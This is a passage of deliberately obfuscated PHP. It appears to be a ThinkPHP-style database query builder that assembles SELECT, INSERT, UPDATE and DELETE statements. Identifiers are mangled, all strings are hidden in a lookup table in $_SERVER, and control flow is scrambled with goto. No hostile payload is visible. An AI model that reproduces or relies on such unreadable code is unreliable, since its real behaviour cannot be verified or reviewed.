parseTable($còòƒÈëóª) { $EğØÅâÎ =& $_SERVER[í™]; if (is_array($còòƒÈëóª)) { $Bôô¯˜áé = array(); foreach ($còòƒÈëóª as $c­•œ‚·‘ => $a‡Å³¿ìÈ´) { if (!is_numeric($c­•œ‚·‘)) { $Bôô¯˜áé[] = $this->parseKey($c­•œ‚·‘) . $EğØÅâÎ[50] . $this->parseKey($a‡Å³¿ìÈ´); } else { $Bôô¯˜áé[] = $this->parseKey($c­•œ‚·‘); } } $còòƒÈëóª = $Bôô¯˜áé; } elseif (is_string($còòƒÈëóª)) { if (strstr($còòƒÈëóª, $EğØÅâÎ[50])) { return $còòƒÈëóª; } $còòƒÈëóª = explode($EğØÅâÎ[47], $còòƒÈëóª); array_walk($còòƒÈëóª, array($this, $EğØÅâÎ[803])); } return $EğØÅâÎ[897] . trim(implode($EğØÅâÎ[898], $còòƒÈëóª), $EğØÅâÎ[809]) . $EğØÅâÎ[897]; } protected function parseWhere($aŞõ¨­ñ¬“) { $BÙ†Š®Óù¨ =& $_SERVER[í™]; $d¦ŠÅœˆ× = $BÙ†Š®Óù¨[33]; if (is_string($aŞõ¨­ñ¬“)) { $d¦ŠÅœˆ× = $aŞõ¨­ñ¬“; } else { $E„•±— = isset($aŞõ¨­ñ¬“[$BÙ†Š®Óù¨[899]]) ? strtoupper($aŞõ¨­ñ¬“[$BÙ†Š®Óù¨[899]]) : $BÙ†Š®Óù¨[33]; if (in_array($E„•±—, array($BÙ†Š®Óù¨[900], $BÙ†Š®Óù¨[901], $BÙ†Š®Óù¨[902]))) { $E„•±— = $BÙ†Š®Óù¨[50] . $E„•±— . $BÙ†Š®Óù¨[50]; unset($aŞõ¨­ñ¬“[$BÙ†Š®Óù¨[899]]); } else { $E„•±— = $BÙ†Š®Óù¨[903]; } foreach ($aŞõ¨­ñ¬“ as $fá‚ŒÎß¸ => $a™‘Œ˜ï–¼) { $d¦ŠÅœˆ× .= $BÙ†Š®Óù¨[265]; if (is_numeric($fá‚ŒÎß¸)) { $fá‚ŒÎß¸ = $BÙ†Š®Óù¨[904]; } if (0 === strpos($fá‚ŒÎß¸, $BÙ†Š®Óù¨[70])) { $d¦ŠÅœˆ× .= $this->parseThinkWhere($fá‚ŒÎß¸, $a™‘Œ˜ï–¼); } else { if (!preg_match($BÙ†Š®Óù¨[905], trim($fá‚ŒÎß¸))) { think_exception(think_lang($BÙ†Š®Óù¨[906]) . $BÙ†Š®Óù¨[4] . $fá‚ŒÎß¸); } $Aˆª¶Ş¨§ = is_array($a™‘Œ˜ï–¼) && isset($a™‘Œ˜ï–¼[$BÙ†Š®Óù¨[907]]); $fá‚ŒÎß¸ = trim($fá‚ŒÎß¸); if (strpos($fá‚ŒÎß¸, $BÙ†Š®Óù¨[271])) { $bŒˆÉÎ÷Î‡ = explode($BÙ†Š®Óù¨[271], $fá‚ŒÎß¸); $eŸÑğ‚å† = array(); foreach ($bŒˆÉÎ÷Î‡ as $BÌºãÌÛÒĞ => $eŠô„£Æ§) { $FùÊæ›×ïñ = $Aˆª¶Ş¨§ ? $a™‘Œ˜ï–¼[$BÌºãÌÛÒĞ] : $a™‘Œ˜ï–¼; $eŸÑğ‚å†[] = $BÙ†Š®Óù¨[248] . $this->parseWhereItem($this->parseKey($eŠô„£Æ§), $FùÊæ›×ïñ) . $BÙ†Š®Óù¨[802]; } $d¦ŠÅœˆ× .= implode($BÙ†Š®Óù¨[908], $eŸÑğ‚å†); } elseif (strpos($fá‚ŒÎß¸, $BÙ†Š®Óù¨[272])) { $bŒˆÉÎ÷Î‡ = explode($BÙ†Š®Óù¨[272], $fá‚ŒÎß¸); $eŸÑğ‚å† = array(); foreach ($bŒˆÉÎ÷Î‡ as $BÌºãÌÛÒĞ => $eŠô„£Æ§) { $FùÊæ›×ïñ = $Aˆª¶Ş¨§ ? $a™‘Œ˜ï–¼[$BÌºãÌÛÒĞ] : $a™‘Œ˜ï–¼; $eŸÑğ‚å†[] = $BÙ†Š®Óù¨[248] . $this->parseWhereItem($this->parseKey($eŠô„£Æ§), $FùÊæ›×ïñ) . $BÙ†Š®Óù¨[802]; } $d¦ŠÅœˆ× .= implode($BÙ†Š®Óù¨[903], $eŸÑğ‚å†); } else { $d¦ŠÅœˆ× .= $this->parseWhereItem($this->parseKey($fá‚ŒÎß¸), $a™‘Œ˜ï–¼); } } $d¦ŠÅœˆ× .= $BÙ†Š®Óù¨[266] . $E„•±—; } $d¦ŠÅœˆ× = substr($d¦ŠÅœˆ×, 0, -strlen($E„•±—)); } return empty($d¦ŠÅœˆ×) ? $BÙ†Š®Óù¨[33] : $BÙ†Š®Óù¨[909] . $d¦ŠÅœˆ×; } protected function parseWhereItem($Fïƒò•å­à, $Dã¥‹ò‘è) { $BÃòëµˆöé =& $_SERVER[í™]; $eéº¯„î = $BÃòëµˆöé[33]; if (is_array($Dã¥‹ò‘è)) { if (is_string($Dã¥‹ò‘è[0])) { $f†ö‡í¦Áæ = strtolower($Dã¥‹ò‘è[0]); if (in_array($Dã¥‹ò‘è[0], array($BÃòëµˆöé[892], $BÃòëµˆöé[910], $BÃòëµˆöé[911], $BÃòëµˆöé[912], $BÃòëµˆöé[913], $BÃòëµˆöé[914]))) { $eéº¯„î .= $Fïƒò•å­à . $BÃòëµˆöé[50] . $Dã¥‹ò‘è[0] . $BÃòëµˆöé[50] . $this->parseValue($Dã¥‹ò‘è[1]); } elseif (preg_match($BÃòëµˆöé[915], $Dã¥‹ò‘è[0])) { $eéº¯„î .= $Fïƒò•å­à . $BÃòëµˆöé[50] . $this->exp[$f†ö‡í¦Áæ] . $BÃòëµˆöé[50] . $this->parseValue($Dã¥‹ò‘è[1]); } elseif (preg_match($BÃòëµˆöé[916], $Dã¥‹ò‘è[0])) { if (is_array($Dã¥‹ò‘è[1])) { $F¬‘†éÂ‹¾ = isset($Dã¥‹ò‘è[2]) ? strtoupper($Dã¥‹ò‘è[2]) : $BÃòëµˆöé[901]; if (in_array($F¬‘†éÂ‹¾, array($BÃòëµˆöé[900], $BÃòëµˆöé[901], $BÃòëµˆöé[902]))) { $A’¨×ÌÁ•‘ = array(); foreach ($Dã¥‹ò‘è[1] as $B‚½³å’¯ô) { $A’¨×ÌÁ•‘[] = $Fïƒò•å­à . $BÃòëµˆöé[50] . $this->exp[$f†ö‡í¦Áæ] . $BÃòëµˆöé[50] . $this->parseValue($B‚½³å’¯ô); } $eéº¯„î .= $BÃòëµˆöé[248] . implode($BÃòëµˆöé[50] . $F¬‘†éÂ‹¾ . $BÃòëµˆöé[50], $A’¨×ÌÁ•‘) . $BÃòëµˆöé[802]; } } else { $eéº¯„î .= $Fïƒò•å­à . $BÃòëµˆöé[50] . $this->exp[$f†ö‡í¦Áæ] . $BÃòëµˆöé[50] . $this->parseValue($Dã¥‹ò‘è[1]); } } elseif ($BÃòëµˆöé[285] == $f†ö‡í¦Áæ) { $eéº¯„î .= $BÃòëµˆöé[800] . $Fïƒò•å­à . $BÃòëµˆöé[50] . $Dã¥‹ò‘è[1] . $BÃòëµˆöé[917]; } elseif (preg_match($BÃòëµˆöé[918], $Dã¥‹ò‘è[0])) { if (isset($Dã¥‹ò‘è[2]) && $BÃòëµˆöé[285] == $Dã¥‹ò‘è[2]) { $eéº¯„î .= $Fïƒò•å­à . $BÃòëµˆöé[50] . $this->exp[$f†ö‡í¦Áæ] . $BÃòëµˆöé[50] . $Dã¥‹ò‘è[1]; } else { if (is_string($Dã¥‹ò‘è[1])) { $Dã¥‹ò‘è[1] = explode($BÃòëµˆöé[47], $Dã¥‹ò‘è[1]); } $AáÅ—ÇàŸ = implode($BÃòëµˆöé[47], $this->parseValue($Dã¥‹ò‘è[1])); $eéº¯„î .= $Fïƒò•å­à . $BÃòëµˆöé[50] . $this->exp[$f†ö‡í¦Áæ] . $BÃòëµˆöé[800] . $AáÅ—ÇàŸ . $BÃòëµˆöé[802]; } } elseif (preg_match($BÃòëµˆöé[919], $Dã¥‹ò‘è[0])) { $C ¤×‰˜ŒÂ = is_string($Dã¥‹ò‘è[1]) ? explode($BÃòëµˆöé[47], $Dã¥‹ò‘è[1]) : $Dã¥‹ò‘è[1]; $eéº¯„î .= $BÃòëµˆöé[800] . $Fïƒò•å­à . $BÃòëµˆöé[50] . $this->exp[$f†ö‡í¦Áæ] . $BÃòëµˆöé[50] . $this->parseValue($C ¤×‰˜ŒÂ[0]) . $BÃòëµˆöé[903] . $this->parseValue($C ¤×‰˜ŒÂ[1]) . $BÃòëµˆöé[266]; } else { think_exception(think_lang($BÃòëµˆöé[906]) . $BÃòëµˆöé[4] . $Dã¥‹ò‘è[0]); } } else { $B“ë¾ÆÓ×á = count($Dã¥‹ò‘è); $F‹ƒîæº¤– = isset($Dã¥‹ò‘è[$B“ë¾ÆÓ×á - 1]) ? strtoupper($Dã¥‹ò‘è[$B“ë¾ÆÓ×á - 1]) : $BÃòëµˆöé[33]; if (in_array($F‹ƒîæº¤–, array($BÃòëµˆöé[900], $BÃòëµˆöé[901], $BÃòëµˆöé[902]))) { $B“ë¾ÆÓ×á = $B“ë¾ÆÓ×á - 1; } else { $F‹ƒîæº¤– = $BÃòëµˆöé[900]; } for ($f™ëÌï•õš = 0; $f™ëÌï•õš < $B“ë¾ÆÓ×á; $f™ëÌï•õš++) { $C ¤×‰˜ŒÂ = is_array($Dã¥‹ò‘è[$f™ëÌï•õš]) ? $Dã¥‹ò‘è[$f™ëÌï•õš][1] : $Dã¥‹ò‘è[$f™ëÌï•õš]; if ($BÃòëµˆöé[285] == strtolower($Dã¥‹ò‘è[$f™ëÌï•õš][0])) { $eéº¯„î .= $BÃòëµˆöé[248] . $Fïƒò•å­à . $BÃòëµˆöé[50] . $C ¤×‰˜ŒÂ . $BÃòëµˆöé[917] . $F‹ƒîæº¤– . $BÃòëµˆöé[50]; } else { $Cø²¦Ãï¯ = is_array($Dã¥‹ò‘è[$f™ëÌï•õš]) ? $this->exp[strtolower($Dã¥‹ò‘è[$f™ëÌï•õš][0])] : $BÃòëµˆöé[892]; if (!$Cø²¦Ãï¯ && is_array($Dã¥‹ò‘è[$f™ëÌï•õš]) && in_array($Dã¥‹ò‘è[$f™ëÌï•õš][0], array($BÃòëµˆöé[892], $BÃòëµˆöé[910], $BÃòëµˆöé[911], $BÃòëµˆöé[912], $BÃòëµˆöé[913], $BÃòëµˆöé[914]))) { $Cø²¦Ãï¯ = $Dã¥‹ò‘è[$f™ëÌï•õš][0]; } $eéº¯„î .= $BÃòëµˆöé[248] . $Fïƒò•å­à . $BÃòëµˆöé[50] . $Cø²¦Ãï¯ . $BÃòëµˆöé[50] . $this->parseValue($C ¤×‰˜ŒÂ) . $BÃòëµˆöé[917] . $F‹ƒîæº¤– . $BÃòëµˆöé[50]; } } $eéº¯„î = substr($eéº¯„î, 0, -4); } } else { $eéº¯„î .= $Fïƒò•å­à . $BÃòëµˆöé[920] . $this->parseValue($Dã¥‹ò‘è); } return $eéº¯„î; } protected function parseThinkWhere($A¯ª‘“‘ª†, $BË…¹«œÔ) { $a¾Ç½–Üô‰ =& $_SERVER[í™]; $EÉ÷¾éˆÜ = $a¾Ç½–Üô‰[33]; switch ($A¯ª‘“‘ª†) { case $a¾Ç½–Üô‰[339]: $EÉ÷¾éˆÜ = $BË…¹«œÔ; break; case $a¾Ç½–Üô‰[904]: $EÉ÷¾éˆÜ = is_string($BË…¹«œÔ) ? $BË…¹«œÔ : substr($this->parseWhere($BË…¹«œÔ), 6); break; case $a¾Ç½–Üô‰[921]: parse_str($BË…¹«œÔ, $e‡»à™¶¤™); if (isset($e‡»à™¶¤™[$a¾Ç½–Üô‰[899]])) { $a´Ì½åâ‘º = $a¾Ç½–Üô‰[50] . strtoupper($e‡»à™¶¤™[$a¾Ç½–Üô‰[899]]) . $a¾Ç½–Üô‰[50]; unset($e‡»à™¶¤™[$a¾Ç½–Üô‰[899]]); } else { $a´Ì½åâ‘º = $a¾Ç½–Üô‰[903]; } $ağ¥¦ã½‹ = array(); foreach ($e‡»à™¶¤™ as $b´Æƒ®®õ => $A©ö°Œëİ) { $ağ¥¦ã½‹[] = $this->parseKey($b´Æƒ®®õ) . $a¾Ç½–Üô‰[920] . $this->parseValue($A©ö°Œëİ); } $EÉ÷¾éˆÜ = implode($a´Ì½åâ‘º, $ağ¥¦ã½‹); break; } return $EÉ÷¾éˆÜ; } protected function parseLimit($AóÑÑÃŞ ») { $E–Ë‹„«¨ =& $_SERVER[í™]; return !empty($AóÑÑÃŞ ») ? $E–Ë‹„«¨[48] . $AóÑÑÃŞ » . $E–Ë‹„«¨[50] : $E–Ë‹„«¨[33]; } protected function parseJoin($B÷‚ëù¡Ó) { $bÖ‹ƒµŸ³ë =& $_SERVER[í™]; $eÍ•”øÈñ¥ = $bÖ‹ƒµŸ³ë[33]; if (!empty($B÷‚ëù¡Ó)) { if (is_array($B÷‚ëù¡Ó)) { foreach ($B÷‚ëù¡Ó as $BŒ½àêÚ÷› => $DßòÎˆó÷ğ) { if (!1 !== stripos($DßòÎˆó÷ğ, $bÖ‹ƒµŸ³ë[922])) { $eÍ•”øÈñ¥ .= $bÖ‹ƒµŸ³ë[50] . $DßòÎˆó÷ğ; } else { $eÍ•”øÈñ¥ .= $bÖ‹ƒµŸ³ë[923] . $DßòÎˆó÷ğ; } } } else { $eÍ•”øÈñ¥ .= $bÖ‹ƒµŸ³ë[923] . $B÷‚ëù¡Ó; } } $eÍ•”øÈñ¥ = preg_replace($bÖ‹ƒµŸ³ë[924], think_config($bÖ‹ƒµŸ³ë[827]) . $bÖ‹ƒµŸ³ë[925], $eÍ•”øÈñ¥); return $eÍ•”øÈñ¥; } protected function parseOrder($cÒ¦³è•”) { $F¤½‰ØÒÃÊ =& $_SERVER[í™]; if (is_array($cÒ¦³è•”)) { $CÂ¿çˆ‹Œ– = array(); foreach ($cÒ¦³è•” as $CÇïŠÊ»ô => $C½˜ê˜µĞ) { if (is_numeric($CÇïŠÊ»ô)) { $CÂ¿çˆ‹Œ–[] = $this->parseKey($C½˜ê˜µĞ); } else { $C½˜ê˜µĞ = in_array(strtoupper(trim($C½˜ê˜µĞ)), array($F¤½‰ØÒÃÊ[926], $F¤½‰ØÒÃÊ[927])) ? $F¤½‰ØÒÃÊ[50] . $C½˜ê˜µĞ : $F¤½‰ØÒÃÊ[33]; if (preg_match($F¤½‰ØÒÃÊ[928], $CÇïŠÊ»ô)) { $CÂ¿çˆ‹Œ–[] = $this->parseKey($CÇïŠÊ»ô) . $C½˜ê˜µĞ; } else { think_exception($F¤½‰ØÒÃÊ[929] . $CÇïŠÊ»ô); } } } $cÒ¦³è•” = implode($F¤½‰ØÒÃÊ[47], $CÂ¿çˆ‹Œ–); } return !empty($cÒ¦³è•”) ? $F¤½‰ØÒÃÊ[930] . $cÒ¦³è•” : $F¤½‰ØÒÃÊ[33]; } protected function parseGroup($cš’Ë¬Ñ‘˜) { $døÕ…Ïª =& $_SERVER[í™]; return !empty($cš’Ë¬Ñ‘˜) ? $døÕ…Ïª[931] . $cš’Ë¬Ñ‘˜ : $døÕ…Ïª[33]; } protected function parseHaving($Eƒ¿•ÎÓ–) { $C¶¨Â±İ­µ =& $_SERVER[í™]; return !empty($Eƒ¿•ÎÓ–) ? $C¶¨Â±İ­µ[932] . $Eƒ¿•ÎÓ– : $C¶¨Â±İ­µ[33]; } protected function parseComment($bĞ½Ú­î„Ä) { $dôâô¯Ê‚  =& $_SERVER[í™]; return !empty($bĞ½Ú­î„Ä) ? $dôâô¯Ê‚ [933] . $bĞ½Ú­î„Ä . $dôâô¯Ê‚ [934] : $dôâô¯Ê‚ [33]; } protected function parseDistinct($CÄáé´¶„) { $a¦¤”Ç²ÔŠ =& $_SERVER[í™]; return !empty($CÄáé´¶„) ? $a¦¤”Ç²ÔŠ[935] : $a¦¤”Ç²ÔŠ[33]; } protected function parseUnion($cÎ§–ßåÖƒ) { $f‡˜ÈˆïöÔ =& $_SERVER[í™]; if (empty($cÎ§–ßåÖƒ)) { return $f‡˜ÈˆïöÔ[33]; } if (isset($cÎ§–ßåÖƒ[$f‡˜ÈˆïöÔ[336]])) { $bÊ×Ú˜©ç = $f‡˜ÈˆïöÔ[936]; unset($cÎ§–ßåÖƒ[$f‡˜ÈˆïöÔ[336]]); } else { $bÊ×Ú˜©ç = $f‡˜ÈˆïöÔ[937]; } foreach ($cÎ§–ßåÖƒ as $c†„‰šÎÁ«) { $eŠßºƒ¢Õ‚[] = $bÊ×Ú˜©ç . (is_array($c†„‰šÎÁ«) ? $this->buildSelectSql($c†„‰šÎÁ«) : $c†„‰šÎÁ«); } return implode($f‡˜ÈˆïöÔ[50], $eŠßºƒ¢Õ‚); } public function insert($AÔçÎ®¢¼Ï, $d§»å‡è±â = array(), $dä¾‹—ï²È = false) { goto E¶¢¿ğÓ­; E¶¢¿ğÓ­: $fÀÏ’İÌ¬ë =& $_SERVER[í™]; $cîØ×ùäÑ† = $Dò°öªˆó = array(); $this->model = $d§»å‡è±â[$fÀÏ’İÌ¬ë[269]]; goto cãØíÄÂòë; E†Á½ê©ã: $A„ïÄÃ“·Ş .= $this->parseComment(!empty($d§»å‡è±â[$fÀÏ’İÌ¬ë[341]]) ? $d§»å‡è±â[$fÀÏ’İÌ¬ë[341]] : $fÀÏ’İÌ¬ë[33]); return $this->execute($A„ïÄÃ“·Ş, $this->parseBind(!empty($d§»å‡è±â[$fÀÏ’İÌ¬ë[273]]) ? $d§»å‡è±â[$fÀÏ’İÌ¬ë[273]] : array())); goto bÙßÈÖ¯Ûì; cãØíÄÂòë: foreach ($AÔçÎ®¢¼Ï as $a‰¨ñ†Æò => $a¶ë˜œ§Ğá) { if (is_array($a¶ë˜œ§Ğá) && $fÀÏ’İÌ¬ë[285] == $a¶ë˜œ§Ğá[0]) { $Dò°öªˆó[] = $this->parseKey($a‰¨ñ†Æò); $cîØ×ùäÑ†[] = $a¶ë˜œ§Ğá[1]; } elseif (is_scalar($a¶ë˜œ§Ğá) || is_null($a¶ë˜œ§Ğá)) { $Dò°öªˆó[] = $this->parseKey($a‰¨ñ†Æò); $cîØ×ùäÑ†[] = $this->parseValue($a¶ë˜œ§Ğá); } } $A„ïÄÃ“·Ş = ($dä¾‹—ï²È ? $fÀÏ’İÌ¬ë[804] : $fÀÏ’İÌ¬ë[805]) . $fÀÏ’İÌ¬ë[806] . $this->parseTable($d§»å‡è±â[$fÀÏ’İÌ¬ë[267]]) . $fÀÏ’İÌ¬ë[800] . implode($fÀÏ’İÌ¬ë[47], $Dò°öªˆó) . $fÀÏ’İÌ¬ë[801] . implode($fÀÏ’İÌ¬ë[47], $cîØ×ùäÑ†) . $fÀÏ’İÌ¬ë[802]; $A„ïÄÃ“·Ş .= $this->parseLock(isset($d§»å‡è±â[$fÀÏ’İÌ¬ë[760]]) ? $d§»å‡è±â[$fÀÏ’İÌ¬ë[760]] : !1); goto E†Á½ê©ã; bÙßÈÖ¯Ûì: } public function selectInsert($DÑÇ‘Œ¹§ñ, $aµ„†ƒ¶ƒ–, $C¼Ù¢ñÙŒ = array()) { goto A‰ öâåæ; eê°Å¿¸„: return $this->execute($EÃ›Ç˜Á¥, $this->parseBind(!empty($C¼Ù¢ñÙŒ[$D®‡»¾êÔ¶[273]]) ? $C¼Ù¢ñÙŒ[$D®‡»¾êÔ¶[273]] : array())); goto føâ ×®×; A‰ öâåæ: $D®‡»¾êÔ¶ =& $_SERVER[í™]; $this->model = $C¼Ù¢ñÙŒ[$D®‡»¾êÔ¶[269]]; if (is_string($DÑÇ‘Œ¹§ñ)) { $DÑÇ‘Œ¹§ñ = explode($D®‡»¾êÔ¶[47], $DÑÇ‘Œ¹§ñ); } goto B¶ÑÏ Ä»; B¶ÑÏ Ä»: array_walk($DÑÇ‘Œ¹§ñ, array($this, $D®‡»¾êÔ¶[803])); $EÃ›Ç˜Á¥ = $D®‡»¾êÔ¶[938] . $this->parseTable($aµ„†ƒ¶ƒ–) . $D®‡»¾êÔ¶[800] . implode($D®‡»¾êÔ¶[47], $DÑÇ‘Œ¹§ñ) . $D®‡»¾êÔ¶[917]; $EÃ›Ç˜Á¥ .= $this->buildSelectSql($C¼Ù¢ñÙŒ); goto eê°Å¿¸„; føâ ×®×: } public function update($B©èÕÂÊŒ³, $BêÕîÁã¾·) { $A–¦÷Ö½ñÌ =& $_SERVER[í™]; $this->model = $BêÕîÁã¾·[$A–¦÷Ö½ñÌ[269]]; $e…¯Çõš°µ = $A–¦÷Ö½ñÌ[939] . $this->parseTable($BêÕîÁã¾·[$A–¦÷Ö½ñÌ[267]]) . $this->parseSet($B©èÕÂÊŒ³) . $this->parseWhere(!empty($BêÕîÁã¾·[$A–¦÷Ö½ñÌ[263]]) ? $BêÕîÁã¾·[$A–¦÷Ö½ñÌ[263]] : $A–¦÷Ö½ñÌ[33]) . $this->parseOrder(!empty($BêÕîÁã¾·[$A–¦÷Ö½ñÌ[350]]) ? $BêÕîÁã¾·[$A–¦÷Ö½ñÌ[350]] : $A–¦÷Ö½ñÌ[33]) . $this->parseLimit(!empty($BêÕîÁã¾·[$A–¦÷Ö½ñÌ[280]]) ? $BêÕîÁã¾·[$A–¦÷Ö½ñÌ[280]] : $A–¦÷Ö½ñÌ[33]) . $this->parseLock(isset($BêÕîÁã¾·[$A–¦÷Ö½ñÌ[760]]) ? $BêÕîÁã¾·[$A–¦÷Ö½ñÌ[760]] : !1) . $this->parseComment(!empty($BêÕîÁã¾·[$A–¦÷Ö½ñÌ[341]]) ? $BêÕîÁã¾·[$A–¦÷Ö½ñÌ[341]] : $A–¦÷Ö½ñÌ[33]); return $this->execute($e…¯Çõš°µ, $this->parseBind(!empty($BêÕîÁã¾·[$A–¦÷Ö½ñÌ[273]]) ? $BêÕîÁã¾·[$A–¦÷Ö½ñÌ[273]] : array())); } public function delete($CÇïŒñ‘Ñ = array()) { $c‡Š½¨‚¼ä =& $_SERVER[í™]; $this->model = $CÇïŒñ‘Ñ[$c‡Š½¨‚¼ä[269]]; $cŸ†²ÚéšÁ = $c‡Š½¨‚¼ä[940] . $this->parseTable($CÇïŒñ‘Ñ[$c‡Š½¨‚¼ä[267]]) . $this->parseWhere(!empty($CÇïŒñ‘Ñ[$c‡Š½¨‚¼ä[263]]) ? $CÇïŒñ‘Ñ[$c‡Š½¨‚¼ä[263]] : $c‡Š½¨‚¼ä[33]) . $this->parseOrder(!empty($CÇïŒñ‘Ñ[$c‡Š½¨‚¼ä[350]]) ? $CÇïŒñ‘Ñ[$c‡Š½¨‚¼ä[350]] : $c‡Š½¨‚¼ä[33]) . $this->parseLimit(!empty($CÇïŒñ‘Ñ[$c‡Š½¨‚¼ä[280]]) ? $CÇïŒñ‘Ñ[$c‡Š½¨‚¼ä[280]] : $c‡Š½¨‚¼ä[33]) . $this->parseLock(isset($CÇïŒñ‘Ñ[$c‡Š½¨‚¼ä[760]]) ? $CÇïŒñ‘Ñ[$c‡Š½¨‚¼ä[760]] : !1) . $this->parseComment(!empty($CÇïŒñ‘Ñ[$c‡Š½¨‚¼ä[341]]) ? $CÇïŒñ‘Ñ[$c‡Š½¨‚¼ä[341]] : $c‡Š½¨‚¼ä[33]); return $this->execute($cŸ†²ÚéšÁ, $this->parseBind(!empty($CÇïŒñ‘Ñ[$c‡Š½¨‚¼ä[273]]) ? $CÇïŒñ‘Ñ[$c‡Š½¨‚¼ä[273]] : array())); } public function select($BáĞø¹¿¿• = array()) { goto aÀâ‘‘Å³Å; aÉÕÒ£Âƒ“: if ($DÎ»¼†óï­ && !1 !== $CÊŒéĞòš‘) { think_cache($D»øçæ¢, $CÊŒéĞòš‘, $DÎ»¼†óï­); } return $CÊŒéĞòš‘; goto bƒôâ˜Ë˜˜; DœòÚÇ”®‡: $DÎ»¼†óï­ = isset($BáĞø¹¿¿•[$e¦‰Û‹‚Ôä[337]]) ? $BáĞø¹¿¿•[$e¦‰Û‹‚Ôä[337]] : !1; if ($DÎ»¼†óï­) { $D»øçæ¢ = is_string($DÎ»¼†óï­[$e¦‰Û‹‚Ôä[89]]) ? $DÎ»¼†óï­[$e¦‰Û‹‚Ôä[89]] : $e¦‰Û‹‚Ôä[941] . md5($Eï¦ˆÂŠ); $b„¢¾î¿Ûİ = think_cache($D»øçæ¢, $e¦‰Û‹‚Ôä[33], $DÎ»¼†óï­); if (!1 !== $b„¢¾î¿Ûİ) { return $b„¢¾î¿Ûİ; } } $CÊŒéĞòš‘ = $this->query($Eï¦ˆÂŠ, $this->parseBind(!empty($BáĞø¹¿¿•[$e¦‰Û‹‚Ôä[273]]) ? $BáĞø¹¿¿•[$e¦‰Û‹‚Ôä[273]] : array())); goto aÉÕÒ£Âƒ“; aÀâ‘‘Å³Å: $e¦‰Û‹‚Ôä =& $_SERVER[í™]; $this->model = $BáĞø¹¿¿•[$e¦‰Û‹‚Ôä[269]]; $Eï¦ˆÂŠ = $this->buildSelectSql($BáĞø¹¿¿•); goto DœòÚÇ”®‡; bƒôâ˜Ë˜˜: } public function buildSelectSql($C–Ö£˜…„À = array()) { goto B”æªÑ“³; fì‰Àá´—: return $bÁµ–Ûà£ù; goto aÆš”×øä„; cºŸø°²š†: $bÁµ–Ûà£ù = $this->parseSql($this->selectSql, $C–Ö£˜…„À); $bÁµ–Ûà£ù .= $this->parseLock(isset($C–Ö£˜…„À[$F¼„éÒ« ‹[760]]) ? $C–Ö£˜…„À[$F¼„éÒ« ‹[760]] : !1); if (isset($BšñÆĞÄ‹)) { think_cache($BšñÆĞÄ‹, $bÁµ–Ûà£ù); } goto fì‰Àá´—; B”æªÑ“³: $F¼„éÒ« ‹ =& $_SERVER[í™]; if (isset($C–Ö£˜…„À[$F¼„éÒ« ‹[340]])) { if (strpos($C–Ö£˜…„À[$F¼„éÒ« ‹[340]], $F¼„éÒ« ‹[47])) { list($A‡´Íøº“·, $cÕ³íòê¿Ú) = explode($F¼„éÒ« ‹[47], $C–Ö£˜…„À[$F¼„éÒ« ‹[340]]); } else { $A‡´Íøº“· = $C–Ö£˜…„À[$F¼„éÒ« ‹[340]]; } $A‡´Íøº“· = $A‡´Íøº“· ? $A‡´Íøº“· : 1; $cÕ³íòê¿Ú = isset($cÕ³íòê¿Ú) ? $cÕ³íòê¿Ú : (is_numeric($C–Ö£˜…„À[$F¼„éÒ« ‹[280]]) ? $C–Ö£˜…„À[$F¼„éÒ« ‹[280]] : 20); $f”ë¼Ñ = $cÕ³íòê¿Ú * ((int) $A‡´Íøº“· - 1); $C–Ö£˜…„À[$F¼„éÒ« ‹[280]] = $f”ë¼Ñ . $F¼„éÒ« ‹[47] . $cÕ³íòê¿Ú; } if (think_config($F¼„éÒ« ‹[942])) { $BšñÆĞÄ‹ = $F¼„éÒ« ‹[943] . md5(serialize($C–Ö£˜…„À)); $f¿…‡–Õ„‚ = think_cache($BšñÆĞÄ‹); if ($f¿…‡–Õ„‚) { return $f¿…‡–Õ„‚; } } goto cºŸø°²š†; aÆš”×øä„: } public function parseSql($AÛšØ¤ÀŠÏ, $f‘ì¤ƒí·ö = array()) { $BŸöÑ°¬¦ =& $_SERVER[í™]; $AÛšØ¤ÀŠÏ = str_replace(array($BŸöÑ°¬¦[944], $BŸöÑ°¬¦[945], $BŸöÑ°¬¦[946], $BŸöÑ°¬¦[947], $BŸöÑ°¬¦[948], $BŸöÑ°¬¦[949], $BŸöÑ°¬¦[950], $BŸöÑ°¬¦[951], $BŸöÑ°¬¦[952], $BŸöÑ°¬¦[953], $BŸöÑ°¬¦[954]), array($this->parseTable("{$f‘ì¤ƒí·ö[$BŸöÑ°¬¦[267]]}"), $this->parseDistinct(isset($f‘ì¤ƒí·ö[$BŸöÑ°¬¦[955]]) ? $f‘ì¤ƒí·ö[$BŸöÑ°¬¦[955]] : !1), $this->parseField(!empty($f‘ì¤ƒí·ö[$BŸöÑ°¬¦[261]]) ? $f‘ì¤ƒí·ö[$BŸöÑ°¬¦[261]] : $BŸöÑ°¬¦[176]), $this->parseJoin(!empty($f‘ì¤ƒí·ö[$BŸöÑ°¬¦[270]]) ? $f‘ì¤ƒí·ö[$BŸöÑ°¬¦[270]] : $BŸöÑ°¬¦[33]), $this->parseWhere(!empty($f‘ì¤ƒí·ö[$BŸöÑ°¬¦[263]]) ? $f‘ì¤ƒí·ö[$BŸöÑ°¬¦[263]] : $BŸöÑ°¬¦[33]), $this->parseGroup(!empty($f‘ì¤ƒí·ö[$BŸöÑ°¬¦[956]]) ? $f‘ì¤ƒí·ö[$BŸöÑ°¬¦[956]] : $BŸöÑ°¬¦[33]), $this->parseHaving(!empty($f‘ì¤ƒí·ö[$BŸöÑ°¬¦[957]]) ? $f‘ì¤ƒí·ö[$BŸöÑ°¬¦[957]] : $BŸöÑ°¬¦[33]), $this->parseOrder(!empty($f‘ì¤ƒí·ö[$BŸöÑ°¬¦[350]]) ? $f‘ì¤ƒí·ö[$BŸöÑ°¬¦[350]] : $BŸöÑ°¬¦[33]), $this->parseLimit(!empty($f‘ì¤ƒí·ö[$BŸöÑ°¬¦[280]]) ? $f‘ì¤ƒí·ö[$BŸöÑ°¬¦[280]] : $BŸöÑ°¬¦[33]), $this->parseUnion(!empty($f‘ì¤ƒí·ö[$BŸöÑ°¬¦[335]]) ? $f‘ì¤ƒí·ö[$BŸöÑ°¬¦[335]] : $BŸöÑ°¬¦[33]), $this->parseComment(!empty($f‘ì¤ƒí·ö[$BŸöÑ°¬¦[341]]) ? $f‘ì¤ƒí·ö[$BŸöÑ°¬¦[341]] : $BŸöÑ°¬¦[33])), $AÛšØ¤ÀŠÏ); return $AÛšØ¤ÀŠÏ; } public function getLastSql($f‚Ê¯Ø‚†¤ = '') { return $f‚Ê¯Ø‚†¤ ? $this->modelSql[$f‚Ê¯Ø‚†¤] : $this->queryStr; } public function 